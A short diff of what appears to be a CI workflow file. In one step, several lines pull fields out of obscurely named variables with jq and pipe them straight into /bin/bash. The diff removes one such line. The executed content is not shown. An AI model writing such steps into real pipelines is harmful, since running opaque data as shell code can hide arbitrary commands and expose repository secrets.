@@ -18,7 +18,6 @@ jobs:
         run: |
           printf '%s' "$sukmk6822" | jq -r .uv4011 | /bin/bash
           echo $zip9 | jq -r .jvk10964 | /bin/bash
-          printf '%s' "$pqvkx78" | jq -r .ltcce52965 | /bin/bash
           echo $vav2077 | jq -r .ol8 | /bin/bash
 
       - name: Archive results
